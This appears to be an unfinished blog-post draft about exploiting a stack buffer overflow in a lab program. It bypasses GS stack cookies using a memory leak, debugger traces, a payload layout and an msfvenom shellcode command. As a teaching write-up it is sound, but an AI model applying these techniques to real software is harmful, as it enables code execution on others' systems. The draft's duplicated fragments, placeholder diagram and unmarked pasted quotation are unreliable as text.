Below is the stack pane in Immunity Debugger after writing 1040 "A"'s into the program which is enough to overwrite the return address plus 4 more bytes.  I labeled the bottom of `overflow()`'s stack frame which contains the contents of the stack cookie. 

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-stackoverwrite.png" alt="stack overwrite">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-stackoverwrite.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

Let's step through the GS-inserted instructions after the overflow to see what happens when the stack cookie is corrupted.

Below the program is about to execute the first GS instruction that obtains the cookie from the stack / moves the cookie from the stack into `ecx`.  At this point, the stack version of the cookie at `0x00F9FA30` contains `41414141`.  This can also be seen in the above stack.  This is also shown above.

We'll see that this value is important since its used in the security check comparison.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-overwrite-1.PNG" alt="GS Epilogue Overwrite 1">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-overwrite-1.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

The second instruction XOR's the base pointer with ecx to produce the program-wide cookie (the value that was copied onto the stack in the first GS instruction in the prologue).  The purpose is to produce the original value before the check is called.

In this case, when the base pointer `00F9FA34` is XOR'ed with `41414141`, it will produce the wrong value.

ebp=00F9FA34
ecx=41414141

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-overwrite-2.PNG" alt="GS Epilogue Overwrite 2">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-overwrite-2.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

The security check function is called with ECX = `41B8BB75` and program cookie = `ECB3D154`.

ds:[00C3E034]=ECB3D154
ecx=41B8BB75
Jump from 00BD3517

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-overwrite-3.PNG" alt="GS Epilogue Overwrite 3">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-overwrite-3.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

The first line of the security check will fail since these values are NOT equal.  The comparison jump is taken to address `00BD75C4` and jumps to `__report_gsfailure` where it executes the failure routine and triggers an exception to terminate the program.  

The program executes `jnz short vuln.00BD75C3` at address `00BD75BF`.  This will invoke `__report_gsfailure`. Jump if not zero


00BD7915=vuln.__report_gsfailure
Jump from 00BD75C4

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-overwrite-6.PNG" alt="GS Epilogue Overwrite 4">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-overwrite-6.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>


{% comment %}
This behavior can also be confirmed in a debugger by setting a breakpoint on the call to the check function at the end of `overflow()`.

```console
0:000> bu 00f073ce
0:000> bl
     0 e Disable Clear  00f073ce     0001 (0001)  0:**** vuln!overflow+0x2e
```

Run the program with go (`g` in WinDbg) and provide the console with at least 1028 bytes of input when prompted.  The program will pause right before the security check function executes.

```console
0:000> g
Breakpoint 0 hit
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f073ce esp=012ff3a0 ebp=012ff7a4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!vuln+0x2e:
00f073ce e83ac1ffff      call    vuln!ILT+9480(__security_check_cookie (00f0350d)

```

Looking at the memory location that stores the copy of the cookie confirms that we have overwritten the GS cookie with `41414141` (AAAA).

```
0:000> dd ebp-4
012ff7a0  41414141 012f0a0a 00f0741c 012ff7f4
012ff7b0  00f077bf 00000001 015480d8 0154f738
```

Step through the instructions with `t` until the check function comparison fails.  This happens when control jumps to `___report_gsfailure()` in the last line.  The failure sequence goes:

`jmp vuln!__security_check_cookie` ->

`cmp ecx,vuln!__security_cookie` ->

`jne vuln!__security_check_cookie+0xb` ->

`jmp vuln!___report_gsfailure`.

```console
0:000> t
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f0350d esp=012ff39c ebp=012ff7a4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!ILT+9480(__security_check_cookie:
00f0350d e9a6400000      jmp     vuln!__security_check_cookie (00f075b8)
0:000> t
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f075b8 esp=012ff39c ebp=012ff7a4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!__security_check_cookie:
00f075b8 3b0d30e0f600    cmp     ecx,dword ptr [vuln!__security_cookie (00f6e030)] ds:002b:00f6e030=ba043c80
0:000> t
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f075be esp=012ff39c ebp=012ff7a4 iopl=0         ov up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000a87
vuln!__security_check_cookie+0x6:
00f075be f27502          bnd jne vuln!__security_check_cookie+0xb (00f075c3) [br=1]
0:000> t
eax=00000405 ebx=011c4000 ecx=406eb6e5 edx=00000000 esi=00f6fe14 edi=00f6fe18
eip=00f075c3 esp=012ff39c ebp=012ff7a4 iopl=0         ov up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000a87
vuln!__security_check_cookie+0xb:
00f075c3 f2e99fc3ffff    bnd jmp vuln!ILT+10595(___report_gsfailure) (00f03968)
```

Continuing execution `gu` leads to the following `int 0x29` error indicating that the program has been terminated due to `Security check failure or stack buffer overrun`.

```console
0:000> gu
(4804.5614): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)
eax=00000001 ebx=00aa8000 ecx=00000002 edx=000001e0 esi=00f6fe14 edi=00f6fe18
eip=00f0792c esp=00d3f474 ebp=00d3f798 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!__report_gsfailure+0x17:
00f0792c cd29            int     29h
```
{% endcomment %}

## Defeating GS Bypass Methods

 {% comment %}
 Calculating Entropy Sources

 If trying to guess or calculate the cookie in a local exploit, the performance counter is the only one that presents a challenge.  In comparison, the first three functions aren't generated so randomly and could be guessed or brute-forced.
 Of the four entropy sources, the performance counter is the only one that presents a challenge in terms of entropy.  In comparison, the first three functions aren't generated so randomly and could be guessed or calculated with enough effort.  when trying to guess or calculate the cookie.  The first three functions on the other hand would be pretty reasonable to guess or brute-force locally (these three values) as they are not generated so randomly.  Sources of low entropy.

According to [sources](), calculating or guessing the cookie is difficult because of perf counter.
{% endcomment %}

At this point, we have enough information on the implementation and behavior of GS in our vulnerable program.  We know the algorithm and data sources used to generate the program-wide cookie at startup and how to calculate and store the cookie on the stack in the vulnerable function at runtime.

A successful exploit is dependent on executing the return instruction of `overflow()`.  This is only possible when the comparison in the security check function succeeds and allows `overflow()` to finish execution.

Based on this information, I can reasonably come up with two general strategies to bypass this mitigation.

* Passing the security check 

To pass the check, the copy of the cookie on the stack must match the program-wide master cookie at the time `__security_check_cookie()` is called.

One method is by calculating, guessing, or approximating the value of the cookie at runtime.  In [Reducing the Effective Entropy of GS Cookies][2] by skape (3/2007), the author presents techniques to guess the value of a program's GS cookie.  The author reports that the only variable source of true entropy for the GS cookie is the low 17 bits of the performance counter. All other sources can be reliably calculated if exploited locally, with some margin of error.

Using the existing knowledge about the uptime of the system and the calculation that can be performed to convert between the performance counter value and seconds, it is possible to fairly accurately guess what the performance counter was at the time that the cookie was generated. Granted, this method is more fuzzy than the previously described methods, as experimental results have shown a large degree of fluctuation in the lower 17 bits. Those results will be discussed in more detail in chapter 5. The actual equation that can be used to generate the estimated performance counter is to take the uptime, as measured in 100 nanosecond intervals, and multiply it by the performance frequency divided by 10000000, which converts the frequency from a measure of 1 second to 100 nanosecond: 

Another method is by obtaining or leaking the value of the cookie at runtime through a memory disclosure vulnerability and writing this value on the stack during the overwrite.

* Avoiding the security check

If an attacker can trigger an exploitable condition and gain control of execution before the cookie is checked, then it stands to reason that GS protection can be avoided completely.

One example / An example scenario was disclosed by the Corelan Group In 2009, the [Corelan Group][3] wrote an excellent article on the topic and gave an exploit that avoids the security check by overwriting an application-specific exception handler structure to trigger an exception before the cookie is checked.  Now that Microsoft has expanded GS to protect the address of exception handler records on the stack, you would need a way to bypass this along with other SEH mitigations enabled by default on modern Visual Studio / Windows such as SEHOP and SafeSEH. 



{% comment %}
In [Reducing the Effective Entropy of GS Cookies][2] by skape (3/2007), the author presents two techniques to make it easier to guess the value of a program's GS cookie.

The first approach involves collecting information locally that makes it possible to calculate the values of the entropy sources that were used to generate the cookie.  The second approach describes the potential for abusing the limited entropy associated with boot start services.  


While this may be a viable technique for modern Windows OS, our vulnerable program leaks already calculated values from the stack which is much more valuable than leaking possible data sources. (i.e. the stack leaks the already calculated cookie not peices of the cookie gen).

Unfortunately, most of the techniques in the article are no longer possible on newer releases of Visual Studio as Microsoft has expanded GS to protect the address of exception handlers, additional GS buffers, and function parameters.  MS also introduced SEHOP and SafeSEH to prevent exploitation of SEH overwrites.  Either way, I felt obligated to point out that other bypass techniques have been reported by reputable researchers.

These include: Bypass using application specific exception handling,Locate code with unprotected buffers, Bypass by overwriting stack data in functions up the stack, Bypass by guessing the cookie, or Bypass because the cookie is static.  

For example, David Litchfield pointed out that even though stack cookies are present, it may still be possible to overwrite exception registration records on the stack which may be called before the function actually returns. This discovery was one of the reasons that Microsoft later introduced SafeSEH (which had its own set of issues)[6].

Summary of bypass methods (based on Corelan's excellent article)
1. Bypass using Exception Handling
So, we can defeat stack protection by triggering an exception before the cookie is checked during the epilogue (or we can try to overwrite other data (parameters that are pushed onto the stack to the vulnerable function), which is referenced before the cookie check is performed.), and then deal with possible SEH protection mechanisms, if any… Of course, this second technique only works if the code is written to actually reference this data. You can try to abuse this by writing beyond the end of the stack.

The key in this scenario is that you need to overwrite far enough, and that there is an application specific exception registered (which gets overwritten). If you can control the exception handler address (in the Exception_Registration structure), then you can try to overwrite the pointer with an address that sits outside the address range of a loaded module. After all, SEH records on the stack are not protected by GS… you only have to bypass SafeSEH.

2. Bypass by replacing cookie on stack and in .data section
Another technique to bypass stack cookie protection is by replacing this authoritative cookie value in the .data section of the module (which is writeable, otherwise the applicaiton would not be able to calculate a new cookie and store it at runtime), and replace the cookie in the stack with the same value. This technique is only possible if you have the ability to write anything at any location. (4 byte artbitrary write) – access violations that state something like the instruction below indicate a possible 4 byte arbitrary write :
mov dword ptr[reg1], reg2
(In order to make this work, you obviously need to be able to control the contents of reg1 and reg2). reg1 should then contain the memory location where you want to write, and reg2 should contain the value you want to write at that address.

3. Bypass because not all buffers are protected
Another exploit opportunity arises when the vulnerable code does not contains string buffers (because there will not be a stack cookie then) This is also valid for arrays of integers or pointers.
[buffer][cookie][EH record][saved ebp][saved eip][arguments ]
Example : If the “arguments” don’t contain pointers or string buffers, then you may be able to overwrite these arguments and take advantage of the fact that the functions are not GS protected.

4. Bypass by overwriting stack data in functions up the stack
When pointers to objects or structures are passed to functions, and these objects or structures resided on the stack of their callers (parent function), then this could lead to GS cookie bypass. (overwrite object and vtable pointer. If you point this pointer to a fake vtable, you can redirect the virtual function call and execute your evil code)

5. Bypass because you can guess/calculate the cookie
Reducing the Effective Entropy of GS Cookies

6. Bypass because the cookie is static
Finally, if the cookie value appears to be the same/static every time, then you can simply put this value on the stack during the overwrite.

According to Wikipedia [2],

[2]: https://en.wikipedia.org/wiki/Buffer_overflow_protection#Random_XOR_canaries

>Random XOR canaries have the same vulnerabilities as random canaries, except that the "read from stack" method of getting the canary is a bit more complicated. The attacker must get the canary, the algorithm, and the control data to generate the original canary for re-encoding into the canary needed to spoof the protection.

Based on this logic, we know the algorithm and the control data to generate the original canary.  The missing piece is to get the canary at runtime. To get the canary we can use the memory leak.
{% endcomment %}

# Exploit Development

In the remainder of this post, I'll model an exploit for (by)passing the security check by leaking the cookie at runtime and using that value in the exploit buffer to overwrite the stack with the correct cookie.  This will trick the security check function into thinking there has been no corruption for the duration of `overflow()` and allow for our malicious payload to run.

## Leveraging the Memory Disclosure Vulnerability

<div class="mermaid">
graph LR;
    A[Hard edge]-->|Link text| B(Round edge)
    B --> C{Decision}
    C -->|One| D[Result one]
    C -->|Two| E[Result two]
</div>

Our sample [vulnerable program] has a memory disclosure vulnerability in `memleak()`.  The function loops through and prints the contents of an uninitialized array.  This ends up leaking contents of the function's stack frame.  Here I'll show what data is actually being leaked from the stack and how we can leverage this in our exploit.

[vulnerable program]: #the-vulnerable-code "Source Code"

We can simply leverage the memory leak vulnerability in `memleak()` to obtain the stack cookie's value and embed it in the payload to bypass the security cookie check.

To refresh, here are the local variables in `memleak()`:

```c
  char buf[64];
  int nr, i;
  unsigned int *value;
  value = (unsigned int*)buf;
```

Going back to the debugger, open the executable in Immunity Debugger, set a breakpoint on `memleak()`, and let the program run until it hits the breakpoint.  Step into/over until after the loop is complete and look at the stack in the lower right pane of the CPU view.

printf starts printing 4-byte addresses from the top of the stack at `value` (pointer to `buf`) at address `00ABFBE8` highlighted in yellow and continues down toward the bottom of the stack. `memleak()`'s frame ends at address `0x00ABFC34`, but printf will output the entire program's frame depending on the number given to the loop counter (i.e. 68 prints full stack).  

Below, a side-by-side comparison displays the stack frame on the left and the console window that prints the output on the right. The addresses highlighted in the console window in gray correspond to `memleak()`'s stack frame on the left.

The **red**{: style="color:red"} arrow points to the XOR'ed **stack cookie**{: style="color:red"} at the 17th address in the console output and the **blue**{: style="color:blue"} arrow points to the **return address**{: style="color:blue"} at the 18th address in the output.  We'll use these address locations in our exploit to build the payload.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/stack-compare.png" alt="Side-by-side Compare">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/stack-compare.png" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>


## Payload Construction

## Overview

{% comment %}
Windows stack addresses are usually not predictable
Executable and library addresses are predictable
System libraries are often static between patch levels
Application libraries change even less frequently
Executable addresses only change between app versions

The cookie that was generated for the image file is XOR'd with the current value of the frame pointer. This value is then placed in the current stack frame at a precisely chosen location by the compiler.
{% endcomment %}

Since the call to `memleak()` is made before `overflow()`, there's a good chance we can leverage the leak to construct an exploit buffer to send to `overflow()`. that leaks stack pointers from its current stack frame.

Using the Python exploit from stage 1, we are able to capture this value from the program output and use it as input to our payload.

Until now, I haven't discussed the significance of the memory leak in `memleak()`.  As it turns out, the value we need to bypass the security check is printed in the leaked stack addresses.  Since the stack frame's cookie is stored on the stack in the prologue of `memleak()` and the program generates one cookie per invocation, we can use the cookie in `memleak()` to bypass the security check in `overflow()`.

Below is the output from running the program in the debugger.  The value provided to `printf>` controls a loop counter that prints 8-byte addresses from the stack.  In the leaked output, I've circled the **17th address** which contains the XOR'd cookie needed to bypass GS protection `0x807128c0`.  Although this location may differ on other computers, it only takes a few minutes to figure out by comparing the output to the values in the debugger.

The first part of constructing this exploit involves embedding the leaked stack cookie in the payload.  We already know how to leak the correct value at runtime.  The next thing to do is ensure proper placement of the cookie in our payload so it aligns to the correct location in the runtime stack.

[As previously discussed], the copy of the stack's cookie is saved in `ebp-4` at the beginning of the function and moved out of `ebp-4` at the end before being passed to the security check routine.  Our exploit must be set up in the following way to ensure proper alignment with the location `ebp-4` at runtime:

[As previously discussed]: #prologue-and-epilogue "prologue and epilogue"

<a href="{{ site.baseurl }}/images/exploit-payload.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/exploit-payload.PNG">
</a>

Shown above is the high-level construction of our payload along with the number of bytes required for precise alignment.  After the buffer and registers are filled, there are 1012 remaining bytes available for a nopsled and `shellcode`.  In my experience, it's fine if some of this space is not used and may take some experimentation to figure out how many bytes to use for each.

The correct value to write in our payload at `ebp-4` can be obtained from the program output at the 17^th address as shown in the [previous section].
`0x807128c0` is the value we'll need to write in our exploit to pass the comparison check.

[previous section]: #leveraging-the-memory-disclosure-vulnerability "Memory leak"


{% comment %}
Second, we need to obtain the correct value to write in our payload at `ebp-4`.  There are a number of ways to view the cookie's value in Windbg.  The first is by setting a program breakpoint on the fourth line in `overflow()`'s prologue when the program-wide cookie is copied to the stack in `eax`.

```nasm
0:000> bu 00fd73a9
0:000> bl
     0 e Disable Clear  00fd73a9     0001 (0001)  0:**** vuln!overflow+0x9
0:000> g
Breakpoint 0 hit
eax=00000007 ebx=008f1000 ecx=00fe21b4 edx=00000030 esi=0103fe14 edi=0103fe18
eip=00fd73a9 esp=00affaac ebp=00affeb0 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
vuln!overflow+0x9:
00fd73a9 a130e00301      mov     eax,dword ptr [vuln!__security_cookie (0103e030)] ds:002b:0103e030=80ded670
```

When the program hits the breakpoint, it prints the address and value of the cookie on the last line: `ds:002b:0103e030=80ded670`.  Alternatively, we can directly access the cookie's value by analyzing the memory at the cookie's address `0x0103e030`.

```nasm
0:000> dd 0103e030 L1
0103e030  80ded670
```

Either way, we end up with the same value: `0x80ded670`.  This is the program-wide master cookie.

Next the cookie will be XOR'd with the current value of the frame pointer and stored on the stack.  We use the debugger again to show the value pointed to by ebp.

```nasm
0:000> r ebp
ebp=00affeb0
```

The ebp register points to `0x00affeb0`.  We complete the algorithm by performing the following computation.

$$\mathtt{0x80ded670}\ \oplus\ \mathtt{0x00affeb0}\ \Rightarrow\ \mathtt{0x807128c0}$$

The result `0x807128c0` is stored on the stack in `ebp-4` for the duration of the function until it is XOR'd again and compared to the master cookie before processing the return address.

This value can also be obtained by stepping through the debugger until after the XOR instruction and checking the contents of `eax`.

```nasm
0:000> r eax
eax=807128c0
```

`0x807128c0` is the value we'll need to write in our exploit to pass the comparison check.

### Leveraging `memleak()` vulnerability

<a href="{{ site.baseurl }}/images/printf.jpg">
<img class="img-center" src="{{ site.baseurl }}/images/printf.jpg">
</a>

To prove this value will circumvent the security check function, we perform the second XOR operation below to show that it results in the original program-wide cookie.

$$\mathtt{0x807128c0}\ \oplus\ \mathtt{0x00affeb0}\ \Rightarrow\ \mathtt{0x80ded670}$$

The result `0x80ded670` is the same value obtained earlier from accessing the program-wide cookie's address directly.  When `__security_check_cookie()` runs, the comparison will succeed and will transfer control back to `overflow()` where our malicious code is waiting to be run.  This proves that we can use this method to bypass stack cookie (GS) mitigation.
{% endcomment %}

## Writing the Exploit

Note that these are the addresses that work on my computer.  These may vary for you.

The important control values in the exploit buffer are the stack cookie and saved return address.  The stack cookie will be replaced with the correct value from `memleak()` explained in the [previous section] and the value to overwrite the saved return address will be explained in the [next section].

[previous section]: #leveraging-memleak-vulnerability "leveraging memleak vulnerability"
[next section]: #finding-return-address "finding return address"


### Stack-based Buffer Overflow / Direct-Ret Overwrite

{% comment %}
 Let's kick things off with our POC, I have cheated a bit and modified the POC to give a basic buffer structure that overwrites EIP with four B's (I assume by now you should be able to use a metasploit pattern).
```
Function vuln!overflow:
  0x00000000`00EFF424 - 0x00000000`00EFF824 buf                       char[] - 1024 bytes
  0x00000000`00EFF824 - 0x00000000`00EFF82A ----- NA ----             - Not Allocated -
  0x00000000`00EFF82A - 0x00000000`00EFF82E --- Canary --             Canary  (0x00000000`741C00EF  )
  0x00000000`00EFF82E - 0x00000000`00EFF832 -- RetAddr --             RA  (0x00000000`F8780108   - BAD)
```
Sending a large string of repeating ASCII characters allows us to easily track how our input affects memory of a running process.  At the time the program crashes, we can search for registers and stack memory overwritten with the ASCII representation `0x41` to `0x44`.

We hope to control the crash and overwrite EIP with exactly `0x43434343` (CCCC).

 To set the postmortem debugger to WinDbg for both 32 and 64 bit applications:
 C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe –I
 C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe –I

 There are a couple of things to take notice of: (1) Our buffer is located in the ESP register which is good news because we can overwrite EIP with a simple RETN to get to our ROP-Chain and (2) we should take note that ESP points 4-bytes into our C-buffer so we will need to compensate those bytes later.
{% endcomment %}

After writing AAAABBBBCCCCDDDD to the stack (thus already overflowing buffer buf[]), we have overwritten the cookie with CCCC and we are about to overwrite saved EIP with EEEE

direct ret/eip overwrite. Classic BOF.

I created a simple script to send the below payload to `vuln.exe` and allowed it to crash in the debugger.  I cheated a bit and modified the POC to give a basic buffer structure that overwrites EIP with four B's.

Good, we now have a basic idea about the memory layout.

**Finding a return address (the long way)**

This exploit can be treated as a classic buffer overflow / We can treat this as a typical buffer overflow vulnerability after (by)passing the security check function using the method described above.  Since we'll be returning directly to the stack, we can find a return address by examining the debugger's stack window when EIP is overwritten.

I sent the below payload to `vuln.exe` to give a basic buffer structure that overwrites EIP with four C's.  Each group of ASCII characters act as a 4-byte placeholder for the real values we'll plug in later where "BBBB" = the base pointer, "CCCC" = instruction pointer, and "DDDD" = the nopsled + shellcode.

```
[ AAAAAAAA...1024 ][  cookie  ][   BBBB   ][   CCCC   ][   DDDD    ]
```

The crash triggers WinDbg as its postportem debugger and prints the last instruction executed along with the current register values (click photo to expand details).

<a href="{{ site.baseurl }}/images/windbg.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/windbg.PNG">
</a>

Looking at the CPU registers on the left confirms we have gained control over the Instruction Pointer (EIP) with `0x43434343` (CCCC) at offset 1032 in the payload.

The crash is caused by an `Access violation` error when the program attempts to read or access an invalid instruction pointer address.  This will be fixed by overwriting the IP with a valid address that exists in one of the loaded modules.

This is what the stack looks like in WinDbg memory view pane / the stack looks like this after the overwrite is complete:

<a href="{{ site.baseurl }}/images/windbg-mem.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/windbg-mem.PNG">
</a>

Our payload in memory represented by `0x44444444...` ("DDDD") is located in the ESP register at `0x008ff82c` which means we can overwrite EIP with the stack pointer address to have the program execute the shellcode.

The stack pointer `0x008ff82c` points to the first `0x44` byte of our malicious payload following the EIP overwrite.  This means we can overwrite EIP with the stack pointer address to have the program execute the shellcode on the stack. at the memory `0x44444444...` ("DDDD") resides.

To execute the shellcode,  This is the address we'll use in the overwrite to have the program execute the shellcode that will replace `0x44444444...` ("DDDD").
One of the requirements for this is having at least one of the registers point to the contents of our payload in memory represented by `0x44444444...` ("DDDD").  

{% comment %}
To execute the shellcode, we need to point the instruction pointer `eip` at this address / location.  This can be achieved by overwriting `eip` with the address of the stack pointer or with an address of `jmp esp`.  (I've tried the exploit both ways with success.)

The next objective is to locate the malicious payload represented by `0x44444444...` ("DDDD").  We'll overwrite the saved return address with one of the registers that point to the contents of our payload in memory.
{% endcomment %}

**Finding a return address (the short way)**

The above is just confirmation that the return address can be obtained from the `memleak()` output at the 18th address.


We can leverage the memory leak vulnerability again to find an exact return address by comparing the output of `memleak()` with the addresses in the stack frame at the time of the crash.  Eventually, I noticed that the tenth address printed by `memleak()` was the same address as the stack pointer at the time of the EIP overwrite and crash in `overflow()`.

{% comment %}
Below shows this comparison.  The top screen shows the state of the registers in WinDbg at the time the program crashes and the lower console shows the output from `memleak()` with the tenth address circled.

<p class="txt-blue-1">Test Sample Text</p>
<p class="txt-blue-2">Test Sample Text</p>
<p style="color: #C188E0;">Test Sample Text</p>

<a href="{{ site.baseurl }}/images/returnaddress.png">
<img class="img-center" src="{{ site.baseurl }}/images/returnaddress.png">
</a>

Because the stack pointer always prints as the tenth address in the memory leak, we have a permanent solution to obtain the stack address for the EIP overwrite despite ASLR and other mitigations.

After overwriting the saved return address with the location of the stack pointer, the first instruction to execute will be a byte `0x90` from our NOP sled.  We'll prepend a generous NOP sled so the decoder has extra space to work when decoding the shellcode.  Eventually program execution will slide through the NOP's until it hits a set of executable instructions from our shellcode.  

To show the transfer from the NOPS to shellcode, I inserted an int3 interrupt to break at the end of the NOP sled where we anticipate execution to be redirected.  This is shown in the disassembly in Figure \ref{transfer} with the current Instruction Pointer in the debugger highlighted in dark gray and black.  With the breakpoint placed at this location, it's confirmed that redirection is occurring as expected.  Without this breakpoint, the Instruction Pointer will slide right into the first executable instruction of our malicious code.
{% endcomment %}

### Generate Shellcode with msfvenom

The last thing we need to complete the exploit is shellcode.  In my exploit I'll launch a simple "pop calc" shellcode.

The command line tool `msfvenom` generates payloads on the fly.  It comes installed with Metasploit Framework and combines the msfpayload and msfencode tools from older versions of MSF.  In my experience, it quickly generates reliable shellcode for a variety of systems.  This section provides a short `msfvenom` primer, so feel free to [skip] if you are already familiar.

[skip]: #results "skip to next section"

The basic syntax to generate a payload requires at minimum two arguments (-p and -f):

```
$ msfvenom -p [payload] OPTION=value .... -f [output format]
```

* **-p [payload]** sets the payload to generate.  In this exploit, I use the "windows/exec" payload that executes an arbitrary command ("windows/x64/exec" is the x64 version).
     To see what payloads are available from Framework:
  - `msfvenom -l payloads | grep windows` lists all payloads and greps for Windows payloads only.
  - `msfvenom -p [payload] --list-options` lists the options that we need to set for each payload.  To use windows/exec, there are two basic options that must be specified by the user.  Default values under Current Settings can be accepted by leaving the option out of the command.
  ```
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  CMD                        yes       The command string to execute
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
  ```
* **-f [format]** specifies the output format.  If not specified, `msfvenom` will output the payload in raw bytes.
  - `msfvenom -l formats` lists supported formats.
  - There are two types of formats: Executable and Transform.  The former saves the shellcode as an application and the latter will output shellcode to the screen that is ready to be copy and pasted in the language of your exploit / language your exploit is written in.
    - For instance, `-f python` outputs the payload in python format:
    ```
    buf =  ""
    buf += "\xdb\xc5\xb8\xb5\x95\xa8\x9c\xd9\x74\x24\xf4\x5f\x29"
    buf += "\xc9\xb1\x31\x83\xc7\x04\x31\x47\x14\x03\x47\xa1\x77"
    ```
    `-f c` outputs the payload in C format:
    ```
    unsigned char buf[] = "\xdb\xde\xd9\x74\x24\xf4\x5e\xb8\x8c\xc0\xba\x17\x31\xc9\xb1";
    ```
    `-f perl` outputs the payload in perl format:
    ```
    my $buf = "\xbb\x6a\xe1\xea\x51\xd9\xce" . "\xd9\x74\x24\xf4\x58\x29\xc9";
    ```
* **-h** displays information for additional arguments.

The shellcode I use in this exploit is generated with:

```
$ msfvenom -p windows/exec CMD=calc.exe -f python -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -v shellcode
```

Some of the arguments I haven't discussed yet:

* CMD=calc.exe sets the CMD variable in the payload to execute the Windows calculator program.  This value can be changed to execute Notepad.exe, CMD.exe, or anything else.
* **-e x86/shikata_ga_nai** encodes the payload using the Polymorphic XOR Additive Feedback Encoder scheme.
* **-b `\x00\x0a\x0d`** avoids the bad characters associated with null characters, new lines, and carriage returns.
* **-v shellcode** specifies a variable name to use in the python output format.

We don't need to be concerned with size constraints as there are over 900 bytes available on the stack for our payload.

```
FAULTING_IP:
unknown!noop+0
43434343 ??

LAST_CONTROL_TRANSFER:  from 44444444 to 43434343

STACK_TEXT:  
WARNING: Frame IP not in any known module. Following frames may be wrong.
008ff828 44444444 44444444 44444444 44444444 0x43434343
008ff874 76aa8484 00691000 76aa8460 868ecc88 0x44444444
008ff888 77802fea 00691000 9c726f3d 00000000 KERNEL32!BaseThreadInitThunk+0x24
008ff8d0 77802fba ffffffff 7781ec28 00000000 ntdll!__RtlUserThreadStart+0x2f
008ff8e0 00000000 00fd16b8 00691000 00000000 ntdll!_RtlUserThreadStart+0x1b

0:000> k
 # ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 008ff828 44444444 0x43434343
01 008ff874 76aa8484 0x44444444
02 008ff888 77802fea KERNEL32!BaseThreadInitThunk+0x24
03 008ff8d0 77802fba ntdll!__RtlUserThreadStart+0x2f
04 008ff8e0 00000000 ntdll!_RtlUserThreadStart+0x1b

```

# Putting it All Together

In this last section, I show how to put all these pieces together to construct the final exploit.  I'll explain this with examples of the exploit code.

## Final Exploit

```
[       buf       ][  ebp-4  ][   ebp   ][   eip   ][  nops  ][  shellcode  ]
```

One of the challenges I faced writing this exploit was figuring out how to interact with the vulnerable program.  The program accepts user input through STDIN twice &mdash; in `memleak()` and again in `overflow()`.  

Ideally, we need to invoke `vuln.exe`, obtain the values we need from the `memleak()` output, craft the payload with the correct values and send it back to `overflow()` all in the *same* invocation.  To pull this off, we'll need a way to pause the program after `memleak()` prints so we have enough time to calculate and construct the exploit.

{% comment %}
capture the output from `memleak()` to use in the payload, construct the payload with the correct values, and send the payload back to `overflow()` all in the *same* invocation.  Since the program generates a new cookie each execution, we only have one shot to create and send the correct payload.  So, after `memleak()` prints, we need a way to pause the program while we construct the exploit.

we need to somehow pause the program, obtain the values we need from the output of the running program, and then craft the payload.
{% endcomment %}

Luckily, the flexibility of Python's `subprocess` module allows us to interact with the program in this way.  We can spawn new processes and connect to their input/output/error pipes using the underlying `Popen` interface ([more on this later]). interactive
This gives us the desired control we need over the program's execution.

[more on this later]: #putting-it-all-together

Using Python's subprocess module for interprocess communication, the exploit program opens pipes to the vulnerable programs standard stream.  This automates the process of providing data through standard input and obtaining the security cookie and stack pointer address from standard output.  See comments in the code for more details on how this protocol is implemented.

Passed to the underlying CreateProcess() function. Open pipes to child's standard input/output/error streams to communicate with program during execution.

As stated earlier, I use Pythons `subprocess` module in the exploit code to interact with the vulnerable program.  This class uses the underlying Windows API function `CreateProcess()` to handle the process creation and management.
